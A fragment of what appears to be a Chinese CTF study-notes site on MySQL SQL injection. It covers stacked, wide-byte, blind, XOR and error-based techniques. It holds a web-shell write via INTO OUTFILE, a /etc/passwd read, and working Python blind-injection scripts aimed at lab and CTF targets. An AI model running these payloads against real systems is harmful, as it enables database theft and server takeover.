\n\u6570\u636e\u5e93\u7248\u672c\uff1aselectversion() , select @@version \n\u6570\u636e\u5e93\u540d\uff1aselectdatabase()\n\u64cd\u4f5c\u7cfb\u7edf\uff1aselect@@version_compile_os\n\u6240\u6709\u53d8\u91cf\uff1ashowvariables\n\u5355\u4e2a\u53d8\u91cf\uff1aselect@@secure_file_priv , show variables like 'secure_file_%'\n\u7206\u5b57\u6bb5\u6570\uff1aorderby 1... \uff0cgroup by 1...\n\u67e5\u5e93\u540d\uff1aselect group_concat(schema_name) from information_schema.schemata\n\u67e5\u8868\u540d\uff1aselect group_concat(table_name) from information_schema.tables where table_schema='\u5e93\u540d'\n\u67e5\u5b57\u6bb5\uff1aselect group_concat(column_name) from information_schema.columns where table_name='\u8868\u540d'\n\u8bfb\u53d6\u67d0\u884c\uff1aselect * from mysql.user limit n,m // limit m offset n \uff08\u7b2cn\u884c\u4e4b\u540em\u884c\uff0c\u7b2c\u4e00\u884c\u4e3a0\uff09\n\u8bfb\u6587\u4ef6\uff1aselectload_file('/etc/passwd')\n\u5199\u6587\u4ef6\uff1aselect'&lt;?php @eval($_POST[a]);?&gt;' into outfile '/var/www/html/a.php'  //\u8be5\u5904\u6587\u4ef6\u540d\u65e0\u6cd5\u4f7f\u752816\u8fdb\u5236\u7ed5\u8fc7\u622a\u53d6\u5b57\u7b26\u4e32\uff1asubstr('abc',1,1)\u3001substring('abc',1,1)\u3001left('abc',1)\u3001right('abc',1)\uff0cmid('abc',1,1)\n\u5b57\u7b26\u4e32\u62fc\u63a5\uff1aconcat('a','b','c')\uff0cconcat_ws(' ','a','b','c')\n\u591a\u884c\u62fc\u63a5\uff1agroup_concat //eg: select group_concat(user) from mysql.user\n\u65f6\u5ef6\u51fd\u6570\uff1asleep(5)\u3001benchmark(10000000,md5('123456')) //\u5176\u4ed6\u65b9\u6cd5get_lock()\uff0c\u7b1b\u5361\u5c14\uff0crlike\u7b49\n\u7f16\u7801\u51fd\u6570: hex\u3001ord\u3001ascii\u3001char\u3001conv(255,10,16)=FF\uff082-36\u8fdb\u5236\u8f6c\u6362\uff09\n\u5e03\u5c14\u6761\u4ef6\uff1aif(1,1,0)\u3001position('a' in 'abc')\u3001elt(1,'a','b')=a&amp;&amp;elt(2,'a','b')=b\u3001(case when (bool) then 1 else 0 end)\u3001field('a',3,2,'a')=3\u3001nullif('a','b')=1&amp;&amp;nullif('a','a')=null\u3001strcmp\u3001regexp\u3001rlike\u3001regexp_like('1','1')1.\u663e\u793amysql\u4e2d\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u79f0.\nmysql&gt;show databases;\n2.\u663e\u793a\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u6240\u6709\u8868\u7684\u540d\u79f0\n\nmysql&gt;show tables;\n\u6216\nmysql&gt;show tables from database_name;\n3.\u663e\u793a\u8868\u4e2d\u5217\u540d\u79f0\nmysql&gt;show columns from database_name.table_name;\n4.\u67e5\u770b\u67d0MySQL\u7528\u6237\u7684\u4f7f\u7528\u6743\u9650\n\nmysql&gt;show grants for user_name;\n5.\u663e\u793acreate database \u8bed\u53e5\u662f\u5426\u80fd\u591f\u521b\u5efa\u6307\u5b9a\u7684\u6570\u636e\u5e93,\u5e76\u53ef\u4ee5\u67e5\u770b\u5230\u521b\u5efa\u5e93\u8bed\u53e5\u7684SQL\u4fe1\u606f\u3002\n1\n\nmysql&gt;show create database database_name;\n6.\u663e\u793acreate table \u8bed\u53e5\u662f\u5426\u80fd\u591f\u521b\u5efa\u6307\u5b9a\u7684\u6570\u636e\u8868,\u5e76\u53ef\u4ee5\u67e5\u770b\u5230\u8868\u521b\u5efa\u8bed\u53e5\u7684SQL\u4fe1\u606f\u3002\n1\n\nmysql&gt;show create table table_name;\n7.\u663e\u793a\u5b89\u88c5\u4ee5\u540e\u53ef\u7528\u7684\u5b58\u50a8\u5f15\u64ce\u548c\u9ed8\u8ba4\u5f15\u64ce\u3002\n1\n\nmysql&gt;show engines;\n8.\u663e\u793a\u6700\u540e\u4e00\u4e2a\u6267\u884c\u7684\u8bed\u53e5\u6240\u4ea7\u751f\u7684\u9519\u8bef\u3001\u8b66\u544a\u548c\u901a\u77e5\n1\n\nmysql&gt; show warnings;\n9.\u53ea\u663e\u793a\u6700\u540e\u4e00\u4e2a\u6267\u884c\u8bed\u53e5\u6240\u4ea7\u751f\u7684\u9519\u8bef\n1\n\nmysql&gt;show errors;\n10.\u663e\u793a\u7cfb\u7edf\u4e2d\u6b63\u5728\u8fd0\u884c\u7684\u6240\u6709\u8fdb\u7a0b\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u6b63\u5728\u6267\u884c\u7684\u67e5\u8be2.\n1\n\nmysql&gt; show processlist\\G\n11.\u67e5\u770b\u6240\u6709\u5b58\u50a8\u8fc7\u7a0b\u3002\n1\n\nmysql&gt; show procedure status;\n12.\u67e5\u770b\u67d0\u4e2a\u5b58\u50a8\u8fc7\u7a0b\u5185\u5bb9\n1\n\nshow create procedure \u5b58\u50a8\u8fc7\u7a0b\u540d\u79f0;\n13.\u67e5\u770b\u51fd\u6570\u7684\u5185\u5bb9.\n1\n\nshow create function func_name;\nPlain Text\n</code></pre> <p>\u9700\u8981\u5173\u6ce8\u7684\u91cd\u70b9</p> <p>information_schema\u5143\u6570\u636e\u5e93</p> <p></p>"},{"location":"web/sql/SQL_Injection/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/","title":"\u5806\u53e0\u6ce8\u5165","text":""},{"location":"web/sql/SQL_Injection/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/#_2","title":"\u5806\u53e0\u6ce8\u5165","text":"<p>\u5728SQL\u4e2d\uff0c\u5206\u53f7\uff08;\uff09\u662f\u7528\u6765\u8868\u793a\u4e00\u6761sql\u8bed\u53e5\u7684\u7ed3\u675f\u3002\u8bd5\u60f3\u4e00\u4e0b\u6211\u4eec\u5728 ; \u7ed3\u675f\u4e00\u4e2asql\u8bed\u53e5\u540e\u7ee7\u7eed\u6784\u9020\u4e0b\u4e00\u6761\u8bed\u53e5\uff0c\u4f1a\u4e0d\u4f1a\u4e00\u8d77\u6267\u884c\uff1f\u56e0\u6b64\u8fd9\u4e2a\u60f3\u6cd5\u4e5f\u5c31\u9020\u5c31\u4e86\u5806\u53e0\u6ce8\u5165\u3002\u800cunion injection\uff08\u8054\u5408\u6ce8\u5165\uff09\u4e5f\u662f\u5c06\u4e24\u6761\u8bed\u53e5\u5408\u5e76\u5728\u4e00\u8d77\uff0c\u4e24\u8005\u4e4b\u95f4\u6709\u4ec0\u4e48\u533a\u522b\u4e48\uff1f\u533a\u522b\u5c31\u5728\u4e8eunion \u6216\u8005union all\u6267\u884c\u7684\u8bed\u53e5\u7c7b\u578b\u662f\u6709\u9650\u7684\uff0c\u53ef\u4ee5\u7528\u6765\u6267\u884c\u67e5\u8be2\u8bed\u53e5\uff0c\u800c\u5806\u53e0\u6ce8\u5165\u53ef\u4ee5\u6267\u884c\u7684\u662f\u4efb\u610f\u7684\u8bed\u53e5\u3002\u4f8b\u5982\u4ee5\u4e0b\u8fd9\u4e2a\u4f8b\u5b50\u3002\u7528\u6237\u8f93\u5165\uff1a1; DELETE FROM products\u670d\u52a1\u5668\u7aef\u751f\u6210\u7684sql\u8bed\u53e5\u4e3a\uff1a\uff08\u56e0\u672a\u5bf9\u8f93\u5165\u7684\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\uff09Select * from products where productid=1;DELETE FROM products\u5f53\u6267\u884c\u67e5\u8be2\u540e\uff0c\u7b2c\u4e00\u6761\u663e\u793a\u67e5\u8be2\u4fe1\u606f\uff0c\u7b2c\u4e8c\u6761\u5219\u5c06\u6574\u4e2a\u8868\u8fdb\u884c\u5220\u9664\u3002</p>"},{"location":"web/sql/SQL_Injection/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/#_3","title":"\u5806\u53e0\u6ce8\u5165","text":"<p>\u4e5f\u5c31\u662f\u8bf4\u4e00\u4e2a\u662f\u4e00\u8d77\u6267\u884c\uff0c\u4e00\u4e2a\u662f\u5206\u5f00\u6765\u6267\u884c\u3002\u4f46\u662f\u5806\u53e0\u6ce8\u5165\u7684\u6743\u9650\uff0c\u73af\u5883\u8981\u6c42\u662f\u6bd4\u8054\u5408\u67e5\u8be2\u9ad8\u7684\uff0c\u800c\u4e14\u670d\u52a1\u5668\u7aef\u5e94\u8be5\u5927\u90e8\u5206\u60c5\u51b5\u4e0d\u4f1a\u8fd4\u56de\u4e24\u6761\u67e5\u8be2\u7ed3\u679c\u3002\u6838\u5fc3\u5c31\u662f\u90a3\u4e2a\";\".</p> <p>\u6bd4\u8f83\u7ecf\u5178\u7684\u4f8b\u9898\uff1a\u5f3a\u7f51\u676f2019\u968f\u4fbf\u6ce8</p> <p>https://blog.csdn.net/qq_26406447/article/details/90643951</p>"},{"location":"web/sql/SQL_Injection/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/","title":"\u5bbd\u5b57\u8282\u6ce8\u5165","text":"<p>\u8fd9\u79cd\u6ce8\u5165\u65b9\u5f0f\u8bd5\u5229\u7528\u7f16\u7801\u7684\u89e3\u6790\u7279\u6027</p> <p>\u5f53php.ini\u4e2dmagic_quotes_gpc\u88ab\u8bbe\u7f6e\u4e3aon\u65f6\uff0c\u63d0\u4ea4\u7684\u53c2\u6570\u4f1a\u88ab\u8f6c\u4e49\uff0c\u4f8b\u5982\uff0c\u5355\u5f15\u53f7\u4f1a\u88ab\u8f6c\u4e49\u6210\u4e86\u2019\u3002\u4e00\u4e0b\u5b50\u622a\u65ad\u4e86\u5b57\u7b26\u578b\u6ce8\u5165\u7684\u8def\u3002</p> <p>GBK\u53cc\u5b57\u8282\u7f16\u7801\uff1a\u4e00\u4e2a\u6c49\u5b57\u7528\u4e24\u4e2a\u5b57\u8282\u8868\u793a\uff0c\u9996\u5b57\u8282\u5bf9\u5e940x81-0xFE\uff0c\u5c3e\u5b57\u8282\u5bf9\u5e940x40-0xFE\uff08\u96640x7F\uff09\uff0c\u521a\u597d\u6db5\u76d6\u4e86\u5bf9\u5e94\u7684\u7f16\u78010x5C\u3002</p> <p>0xD5 0x5C \u5bf9\u5e94\u4e86\u6c49\u5b57\u201c\u8aa0\u201d\uff0c\u4e8e\u662f %d5%5c \u7ecfURL\u89e3\u7801\u540e\u4e3a\u201c\u8aa0\u201d\u3002</p> <p>\u5f53\u6211\u4eec\u63d0\u4ea4\u53c2\u6570 %d5\u2032 \uff0c\u7ecf\u6d4f\u89c8\u5668URL\u7f16\u7801\u540e\u4e3a%d5%27\uff0c\u518d\u7ecfPHP URL\u89e3\u7801\u540e\u4e3a0xd50x27\uff0c\u518d\u7ecfPHP\u8f6c\u4e49\u540e\u4e3a0xd50x5c0x27\uff0c\u5373\u5c31\u662f\u57280x27(\u2018)\u4e4b\u524d\u63d2\u5165\u4e86\u8f6c\u4e49\u7b260x5c\uff08\\\uff09\u3002\u5f53MySQL\u91c7\u7528GBK\u7f16\u7801\u8fde \u63a5\u65f6\uff0c0xd50x5c0x27\u8fd9\u4e00\u5b57\u8282\u5e8f\u5217\u5c31\u88abMySQL\u4f5c\u4e3aGBK\u7f16\u7801\u7406\u89e3\uff1a\u8aa0\u2019\u3002</p> <p>\u8fd9\u6837\u5c31\u5403\u6389\u4e86PHP\u7684\u8f6c\u4e49\u7b26\uff0c\u4ece\u800c\u7a81\u7834\u4e86\u5355\u5f15\u53f7\u8f6c\u4e49\u7684\u9650\u5236\u3002</p> <p>\u8fc7\u6ee4 ' \u7684\u65f6\u5019\u5f80\u5f80\u5229\u7528\u7684\u601d\u8def\u662f\u5c06 '\u8f6c\u6362\u4e3a \\' \u3002</p> <p>\u5728 mysql \u4e2d\u4f7f\u7528 GBK \u7f16\u7801\u7684\u65f6\u5019\uff0c\u4f1a\u8ba4\u4e3a\u4e24\u4e2a\u5b57\u7b26\u4e3a\u4e00\u4e2a\u6c49\u5b57\uff0c\u4e00\u822c\u6709\u4e24\u79cd\u601d\u8def\uff1a</p> <p>\uff081\uff09%df \u5403\u6389  \u5177\u4f53\u7684\u65b9\u6cd5\u662f urlencode(') = %5c%27\uff0c\u6211\u4eec\u5728 %5c%27 \u524d\u9762\u6dfb\u52a0 %df \uff0c\u5f62\u6210%df%5c%27 \uff0c\u800c mysql \u5728 GBK \u7f16\u7801\u65b9\u5f0f\u7684\u65f6\u5019\u4f1a\u5c06\u4e24\u4e2a\u5b57\u8282\u5f53\u505a\u4e00\u4e2a\u6c49\u5b57\uff0c%df%5c \u5c31\u662f\u4e00\u4e2a\u6c49\u5b57\uff0c%27 \u4f5c\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684\uff08'\uff09\u7b26\u53f7\u5728\u5916\u9762\uff1a</p> <p>id=-1%df%27union select 1,user(),3--+</p> <p>\uff082\uff09\u5c06 \\' \u4e2d\u7684  \u8fc7\u6ee4\u6389\uff0c\u4f8b\u5982\u53ef\u4ee5\u6784\u9020 %**%5c%5c%27 \uff0c\u540e\u9762\u7684 %5c \u4f1a\u88ab\u524d\u9762\u7684 %5c \u6ce8\u91ca\u6389\u3002</p> <p>\u4e00\u822c\u4ea7\u751f\u5bbd\u5b57\u8282\u6ce8\u5165\u7684PHP\u51fd\u6570\uff1a</p> <p>1.replace\uff08\uff09\uff1a\u8fc7\u6ee4 '  \uff0c\u5c06 ' \u8f6c\u5316\u4e3a \\' \uff0c\u5c06  \u8f6c\u4e3a \\\uff0c\u5c06 \" \u8f6c\u4e3a \\\" \u3002\u7528\u601d\u8def\u4e00\u3002</p> <p>2.addslaches()\uff1a\u8fd4\u56de\u5728\u9884\u5b9a\u4e49\u5b57\u7b26\u4e4b\u524d\u6dfb\u52a0\u53cd\u659c\u6760\uff08\\\uff09\u7684\u5b57\u7b26\u4e32\u3002\u9884\u5b9a\u4e49\u5b57\u7b26\uff1a' , \" ,  \u3002\u7528\u601d\u8def\u4e00</p> <p>3..mysql_real_escape_string()\uff1a\u8f6c\u4e49\u4e0b\u5217\u5b57\u7b26\uff1a</p> <p>\\x00    \\n     \\r         '     \"     \\x1a</p>"},{"location":"web/sql/SQL_Injection/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/","title":"\u5e03\u5c14\u76f2\u6ce8","text":"<p>\u5e03\u5c14\u76f2\u6ce8\uff0c\u6545\u540d\u601d\u610f\uff0c\u4e0ebool\u4ee3\u6570\u7684\u8fd0\u7b97\u6709\u5173\uff0c\u4e5f\u5c31\u662f\u548ctrue\u548cfalse\u6709\u5173</p> <p>\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u7ed9\u6211\u4eec\u7684\u54cd\u5e94\uff0c\u751f\u6d3b\u4e2d\u8fd9\u4e2a\u6f0f\u6d1e\u76f8\u5bf9\u6765\u8bf4\u8fd8\u662f\u6bd4\u8f83\u591a\u3002</p> <p>\u5177\u4f53\u6765\u8bf4\u5c31\u662f\u6211\u4eec\u95ee\u670d\u52a1\u5668XXX\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u4e0d\u662fa\u4ed6\u544a\u8bc9\u4f60\u4e0d\u662f\uff0c\u7136\u540e\u4f60\u95ee\u5b83\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u4e0d\u662fb..................................\u4e00\u76f4\u63a8\u4e0b\u53bb\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u4e00\u4e2a\u5b57\u7b26\u7206\u7834\u51fa\u4f60\u60f3\u67e5\u8be2\u7684\u4fe1\u606f\u3002</p> <p>\u4e3b\u8981\u9760\u7684\u8fd8\u662f\u624e\u5b9e\u7684py\u811a\u672c\u529f\u592b</p> <p>bool\u76f2\u6ce8\u4f9d\u8d56\u4e8e\u811a\u672c\uff0c\u8fd9\u91cc\u7ed9\u51fa\u51e0\u4e2abool\u76f2\u6ce8\u7684\u811a\u672c</p> <p>\u8fd9\u91cc\u90fd\u662f\u4e8c\u5206\u6cd5\uff0c\u904d\u5386\u4e5f\u884c\uff0c\u4f46\u5927\u5bb6\u90fd\u5b66\u8fc7\u65f6\u95f4\u590d\u6742\u5ea6\uff0c\u5bf9\u5427\u3002</p> <pre><code>import requests\nimport time\nurl = \"\"\nfiles = {\"file\": \"123456789\"}\n'''\u5b57\u6bb5\u503c'''\nflag=''\nfor i in range(1,100):\nlow = 32\nhigh = 128\nmid = (low+high)//2\nwhile (low &lt; high):\ntime.sleep(0.06)\npayload_flag = {\n'username': \"test\\\" or (ascii(substr((select secret from flag_tbl),{0},1))&gt;{1}) #\".format(i,mid),'password': 'test'}\nr = requests.post(url=url,params=payload_flag,files=files, data={\"PHP_SESSION_UPLOAD_PROGRESS\": \"123456789\"},\ncookies={\"PHPSESSID\": \"test1\"})\nprint(payload_flag)\nif '&lt;meta http-equiv=\"refresh\" content=\"0; url=?p=home\" /&gt;' in r.text:\nlow = mid +1\nelse:\nhigh = mid\nmid = (low + high) // 2\nif(mid==32 or mid == 132):\nbreak\nflag +=chr(mid)\nprint(flag)\nprint(flag)\nPlain Text\n</code></pre> <pre><code>import requests\nurltest=\"http://127.0.0.1/index.php?id=1' and ascii(substr((select user()),1,1))=114%23\" #\u9a8c\u8bc1\u9875\u9762\uff0c\u901a\u5e38\u4e3a\u6b63\u786e\u9875\u9762\nURL=requests.get(urltest)\nfor j in range(1,10):\nfor i in range(33,125):\ni=str(i)\nj=str(j)\nurl=\"http://127.0.0.1/index.php?id=1' and ascii(substr((select user()),\"+j+\",1))=\"+i+\"%23\" #\u6ce8\u5165\u7528\u4e8e\u6bd4\u5bf9\u7684URL\n#print url\nurl=requests.get(url)\nif url.text==URL.text:\nprint chr(int(i))\n---------------------------------------------------\nimport requests\ndef database_len():\nfor i in range(1,10):\nurl = '''http://127.0.0.1/sqli-labs-master/Less-8/index.php'''\npayload = '''?id=1' and length(database())&gt;%s''' %i\n# print(url+payload+'%23')\nr = requests.get(url+payload+'%23')\nif 'You are in' in r.text:\nprint(i)\n\nelse:\n#print('false')\nprint('database_length:',i)\nbreak\ndatabase_len()\n\ndef database_name():\nname = ''\nfor j in range(1,9):\nfor i in 'sqcwertyuioplkjhgfdazxvbnm':\nurl = \"http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1' and substr(database(),%d,1)='%s'\" %(j,i)\n# print(url+'%23')\nr = requests.get(url+'%23')\nif 'You are in' in r.text:\nname = name+i\n\nprint(name)\n\nbreak\nprint('database_name:',name)\n\n\n\ndatabase_name()\nPlain Text\n</code></pre> <pre><code>import time\nimport requests\nurl = \"\"\nresult = ''\ni = 0\nwhile True:\ni = i + 1\nhead = 32\ntail = 127\nwhile head &lt; tail:\nmid = (head + tail) &gt;&gt; 1\n# payload = '(ascii(substr(database(),%d,1))&gt;%d)' % (i, mid)\n# payload = f'(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))&gt;{mid})'\n# payload = f'(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\"F1naI1y\")),{i},1))&gt;{mid})'\npayload = f'(ascii(substr((select(group_concat(password))from(F1naI1y)),{i},1))&gt;{mid})'\nr = requests.get(url + payload)\n# print(r.text)\ntime.sleep(0.1)\nif \"Click\" in r.text:\nhead = mid + 1\nelse:\ntail = mid\nif head != 32:\nresult += chr(head)\nelse:\nbreak\nprint(result)\nPlain Text\n</code></pre> <pre><code>import requests\nimport time\n# url\u662f\u968f\u65f6\u66f4\u65b0\u7684\uff0c\u5177\u4f53\u7684\u4ee5\u505a\u9898\u65f6\u5019\u7684\u4e3a\u51c6\nurl = 'http://8d08c7b6-e6f3-4df0-b71c-a2a397891bab.node3.buuoj.cn/search.php?id='\ni = 0\nflag = ''\nwhile True:\ni += 1\n# \u4ece\u53ef\u6253\u5370\u5b57\u7b26\u5f00\u59cb\nbegin = 32\nend = 126\ntmp = (begin + end) // 2\nwhile begin &lt; end:\nprint(begin, tmp, end)\ntime.sleep(0.1)\n# \u7206\u6570\u636e\u5e93\n# payload = \"''or(ascii(substr(database(),%d,1))&gt;%d)\" % (i, tmp)\n# \u7206\u8868\n# payload = \"''or(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),%d,1))&gt;%d)\" % (i, tmp)\n# \u7206\u5b57\u6bb5\n# payload = \"''or(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME='F1naI1y')),%d,1))&gt;%d)\" % (i, tmp)\n# \u7206flag \u8981\u8dd1\u5f88\u4e45\n# payload = \"''or(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)\" % (i, tmp)\n# \u7206flag \u5f88\u5feb\npayload = \"''or(ascii(substr((select(password)from(F1naI1y)where(username='flag')),%d,1))&gt;%d)\" % (i, tmp)\n# \u9519\u8bef\u793a\u4f8b\n# payload = \"''or(ascii(substr((select(GROUP_CONCAT(fl4gawsl))from(Flaaaaag)),%d,1))&gt;%d)\" % (i, tmp)\nr = requests.get(url+payload)\nif 'Click' in r.text:\nbegin = tmp + 1\ntmp = (begin + end) // 2\nelse:\nend = tmp\ntmp = (begin + end) // 2\nflag += chr(tmp)\nprint(flag)\nif begin == 32:\nbreak\nPlain Text\n</code></pre> <p>\u56e0\u4e3abool\u76f2\u6ce8\u7684\u4f4d\u7f6e\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u6709\u53ef\u80fd\u662f\u5728url\u4e2d\u4ee5get\u5f62\u5f0f\uff0c\u6216\u8005POST\u51fa\u7684\u6570\u636e\u7b49\u7b49\u6240\u4ee5\u6a21\u677f\u5f62\u5f0f\u4e5f\u4e0d\u552f\u4e00\uff0c\u4e0d\u8fc7\u53ea\u8981\u638c\u63e1requests\u5305\uff08\u7c7b\u4f3c\u5b66pwn\u7684\u90fd\u4f1a\u7528\u5230\u7684pwn\uff09\uff0c\u7406\u89e3\u53d1\u9001http\u7684\u6d41\u7a0b\uff0c\u5c31\u662f\u5728\u6a21\u677f\u4e0a\u8fdb\u884c\u4fee\u6539\u7684\u64cd\u4f5c\u4e86\u3002</p>"},{"location":"web/sql/SQL_Injection/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/#_2","title":"\u65f6\u95f4\u76f2\u6ce8","text":"<p>\u539f\u7406\u548cbool\u76f2\u6ce8\u4e00\u6a21\u4e00\u6837</p> <p>\u533a\u522b\u70b9\u5728\u4e8ebool\u5224\u65ad\u503c\u53d8\u6210\u4e86\u65f6\u95f4</p> <p>\u4e5f\u5c31\u662f\u8bf4\u5982\u679cbool\u4e3atrue,\u8fd4\u56de\u7684\u65f6\u95f4\u4e3a0.1s</p> <p>\u5982\u679c\u4e3afalse\uff0c\u8fd4\u56de\u7684\u65f6\u95f4\u4e3a1s</p> <p>\u8fd9\u4e0d\u5c31\u662f\u4e2a\u5bf9\u9519\u4e86\u561b</p> <p>\u6240\u4ee5\u76f4\u63a5\u5c31\u7ed9\u51fa\u811a\u672c\u4e86</p> <pre><code>import requests\nurl=\"http://fe5d8a13-c089-4e47-847d-b43c1622a20d.node3.buuoj.cn/index.php?action=publish\"\ncookie = {\"PHPSESSID\":\"silql33d2jbdqnqp0l6san8rr4\"}\nk=\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\nflag=\"\"\nfor i in range(50):\nfor j in k:\nj = ord(j)\ndata={\n'mood':'0',\n'signature':'1`,if(ascii(substr((select password from ctf_users where username=`admin`),{},1))={},sleep(3),0))#'.format(i,j)\n}\ntry:\nr=requests.post(url,data=data,cookies=cookie,timeout=(2,2))\nexcept:\nflag+=chr(j)\nprint(flag)\nbreak\nPlain Text\n</code></pre> <p>\u867d\u7136\u9488\u5bf9\u7279\u522b\u7684\u9898\u76ee\uff0c\u4f46\u662f\u6539\u4e00\u6539\u5c31\u80fd\u7528\u4e86\uff0c\u751a\u81f3\u4e5f\u80fd\u591f\u6539\u9020\u6210bool\u76f2\u6ce8\u7684\u811a\u672c\u3002</p> <p>\u627e\u4e0d\u5230\u5f53\u65f6\u7684\u4f8b\u9898\u4e86</p>"},{"location":"web/sql/SQL_Injection/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/#_3","title":"\u5f02\u6216\u6ce8\u5165","text":"<p>\u5f02\u6216\u6ce8\u5165\u5f0f\u4e00\u79cd\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u66f4\u50cf\u662f\u4e00\u79cd\u601d\u7ef4</p> <p>\u5728\u8ba1\u7b97\u673a\u4e8c\u8fdb\u5236</p> <p>1^1=0</p> <p>1^0=1</p> <p>0^1=1</p> <p>0^0=0</p> <p>\u7136\u540e\u80fd\u5e72\u5565\u5462\uff1f</p> <p>\u8003\u8651\u8fd9\u6837\u7684sql\u8bed\u53e5</p> <pre><code>id=1^(ascii(substr((select(database())),%d,1))&lt;%d)^1\" % (i,mid)\nPlain Text\n</code></pre> <p>\u8fd9\u662f\u4e00\u6761python\u8bed\u53e5\uff0c\u770b\u7684\u5230\u7684\u662f\u5f02\u6216\u3002</p> <p>\u7136\u540e\u4e2d\u95f4\u7684(ascii(substr((select(database())),%d,1))&lt;%d)\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f</p> <p>\u8fd4\u56de\u7684\u662ftrue\u6216false\uff0c\u5728\u8ba1\u7b97\u673a\u4e2d\u53ef\u4ee5\u770b\u6210\u662f1\u548c0</p> <p>\u7136\u540e\u4ed4\u7ec6\u770b\u6267\u884c\u7684sql\u8bed\u53e5\u53d61\u4e2a\u5b57\u7b26\u8f6c\u6362\u4e3aascii\u7801\u548c\u4e00\u4e2a\u6570\u5b57\u505a\u6bd4\u8f83\uff0c\u5f97\u52301\u62160\uff0c\u518d\u5f02\u6216.</p> <p>\u6700\u7ec8id=1\u62160</p> <p>\u5047\u5982\u6b64\u65f6\u5f53id=1\u65f6\u56de\u663e\u6b63\u5e38\uff0c\u4e3a0\u65f6\u56de\u663e\u9519\u8bef\uff0c\u6211\u4eec\u5c31\u6709\u4e86\u4e00\u4e2a\u5b89\u5168\u53ef\u9760\u7684\u6bd4\u8f83\u5668\u3002</p> <p>\u8fd9\u91cc\u5176\u5b9e\u662fbool\u76f2\u6ce8\u7684\u59ff\u52bf\u3002</p> <p>\u5176\u5b9e\u8fd9\u6837\u5f02\u6216\u7684\u601d\u60f3\u5728\u5f88\u591a\u5730\u65b9\u90fd\u5b58\u5728\uff1a</p> <p>\u751a\u81f3\u8fc7\u6ee4\u4e86\u6570\u5b57\u5b57\u6bcd</p> <p>\u6211\u4eec\u53ef\u4ee5\u7528\u4e24\u4e2a\u6c49\u5b57\u5f02\u6216\u6765\u8fdb\u884c\u6ce8\u5165\u3002</p>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","title":"\u62a5\u9519\u6ce8\u5165","text":"<p>\u5f88\u91cd\u8981\uff0c\u800c\u4e14\u539f\u7406\u4e0a\u6211\u89c9\u5f97\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u96be\u7406\u89e3\u3002</p> <p>\u5f53\u7136\u7528\u8d77\u6765\u7531\u4e8e\u6bd4\u8f83\u56fa\u5b9a\uff0c\u62ff\u7740\u73b0\u6210\u7684payload\u6162\u6162\u53bb\u6539\u5c31\u884c\u4e86</p> <p>\u62a5\u9519\u6ce8\u5165\u5728\u6ca1\u6cd5\u7528union\u8054\u5408\u67e5\u8be2\u65f6\u7528\uff0c\u4f46\u524d\u63d0\u8fd8\u662f\u4e0d\u80fd\u8fc7\u6ee4\u4e00\u4e9b\u5173\u952e\u7684\u51fd\u6570\u3002</p> <p>\u62a5\u9519\u6ce8\u5165\u5c31\u662f\u5229\u7528\u4e86\u6570\u636e\u5e93\u7684\u67d0\u4e9b\u673a\u5236\uff0c\u4eba\u4e3a\u5730\u5236\u9020\u9519\u8bef\u6761\u4ef6\uff0c\u4f7f\u5f97\u67e5\u8be2\u7ed3\u679c\u80fd\u591f\u51fa\u73b0\u5728\u9519\u8bef\u4fe1\u606f\u4e2d\u3002\u770b\u8fc7\u65e0\u5217\u540d\u6ce8\u5165\u90a3\u91ccjoin\u7684\u8bdd\uff0c\u6309\u9053\u7406\u6765\u8bf4\uff0c\u539f\u7406\u5dee\u4e0d\u591a\u3002</p>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#xpath","title":"xpath\u8bed\u6cd5\u9519\u8bef","text":"<p>\u5229\u7528xpath\u8bed\u6cd5\u9519\u8bef\u6765\u8fdb\u884c\u62a5\u9519\u6ce8\u5165\u4e3b\u8981\u5229\u7528<code>extractvalue</code>\u548c<code>updatexml</code>\u4e24\u4e2a\u51fd\u6570\u3002</p> <p>\u4f7f\u7528\u6761\u4ef6\uff1amysql\u7248\u672c&gt;5.1.5</p> <p>\u8fd9\u4e24\u4e2a\u51fd\u6570\u7528\u8d77\u6765\u662f\u6ca1\u4ec0\u4e48\u533a\u522b\u7684</p>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#extractvalue","title":"extractvalue\u51fd\u6570\uff1a","text":"<p>\u51fd\u6570\u539f\u578b\uff1aextractvalue(xml_document,Xpath_string)</p> <ul> <li> <p>\u6b63\u5e38\u8bed\u6cd5\uff1aextractvalue(xml_document,Xpath_string);</p> </li> <li> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1axml_document\u662fstring\u683c\u5f0f\uff0c\u4e3axml\u6587\u6863\u5bf9\u8c61\u7684\u540d\u79f0</p> </li> <li> 